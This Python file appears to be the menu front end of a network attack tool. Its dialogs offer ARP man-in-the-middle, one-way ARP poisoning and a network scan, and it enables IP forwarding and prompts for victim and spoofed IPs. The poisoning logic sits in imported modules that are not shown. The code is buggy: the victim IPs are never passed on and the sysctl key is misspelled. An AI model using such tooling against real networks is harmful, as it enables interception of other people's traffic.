from arpPoison import *
from networkScan import *
import os
from prompt_toolkit.shortcuts import button_dialog, input_dialog

"""
print("Welcome to the tool, this tool is a console style tool.")
print("For the list of commands use the command 'help'")
print("For more info on a command use the command 'help [command]'")
print("to close or reset the tool, use the input 'ctrl+c'")
print(">>>", end = " ")
"""

runner = True

while runner:
    
    user_in = button_dialog(title = "Tool",
                        text = "Please select the desired function",
                        buttons=[
                            ("MiM", "mimattack"),
                            ("One Way", "onewaypoisoning"),
                            ("Scanner", "scan"),
                            ("exit", "exit")
                        ]).run()
        
    if(user_in == "mimattack"):
        
        pap = button_dialog(title = "Tool",
                            text = "Use the defult interface?",
                            buttons=[
                            ("Yes", True),
                            ("No", False),
                            ("Cancel", None)
                            ]).run()
        
        os.system("sysctl net.ipv4.ipforward=1")
    
        if (pap != None):
            
            os.system("sysctl net.ipv4.ipforward=1")
            
            ipVictim = input_dialog(title = "Tool",
                                    text = "Ip of the first Victim?").run()
        
            ipVictim2 = input_dialog(title = "Tool",
                                    text = "Ip of the second Victim?").run()
            
            if pap == False:
                interface = input_dialog(title = "Tool",
                                         text = "Interface?").run()
                
                oneWayPoisoning(interface)
                 
            oneWayPoisoning(None)
        
    elif(user_in == "onewaypoisoning"):
        
        pap = button_dialog(title = "Tool",
                            text = "Use the defult interface?",
                            buttons=[
                            ("Yes", True),
                            ("No", False),
                            ("Cancel", None)
                            ]).run()
        
        if (pap != None):
            
            os.system("sysctl net.ipv4.ipforward=1")
            
            ipVictim = input_dialog(title = "Tool",
                                    text = "Ip of the Victim?").run()
        
            ipToSpoof = input_dialog(title = "Tool",
                                    text = "Ip to spoof?").run()
            
            if pap == False:
                interface = input_dialog(title = "Tool",
                                         text = "Interface?").run()
                
                oneWayPoisoning(interface)
                 
            oneWayPoisoning(None)
    
    elif(user_in == "scan"):
        
        scan_mode = button_dialog(title = "Tool",
                            text = "Use automatic scan?",
                            buttons=[
                            ("Yes", True),
                            ("No", False),
                            ("Cancel", None)
                            ]).run()
        
        if(scan_mode == True):
            auto_scan()
        elif(scan_mode == False):
            
            gateway = input_dialog(title = "Tool",
                                   text = "Gateway ip of the interface?").run()
            
            subnetmask = input_dialog(title = "Tool",
                                      text = "Subnet mask of the interface?").run()
            
            manual_scan(gateway, subnetmask)
    
    elif(user_in == "exit"):
         runner = False